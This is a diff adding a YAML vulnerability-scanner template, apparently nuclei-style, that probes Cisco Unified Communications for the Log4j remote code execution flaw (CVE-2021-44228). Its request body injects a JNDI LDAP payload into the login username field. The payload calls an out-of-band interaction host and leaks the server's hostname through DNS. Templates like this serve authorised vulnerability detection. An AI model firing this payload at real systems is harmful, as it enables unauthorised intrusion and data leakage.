@@ -1,0 +1,32 @@
+id: cisco-unified-communications-log4j-rce
+brief:
+    title: Cisco Unified Communications - Remote Code Execution (Apache Log4j)
+    by: DhiyaneshDK
+    level: critical
+    about: Cisco Unified Communications is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full con...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - cisco
+        - kev
+        - oast
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/ccmadmin/j_security_check'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{BaseURL}}'
+        Referer: '{{BaseURL}}/ccmadmin/showHome.do'
+      body: appNav=ccmadmin&j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
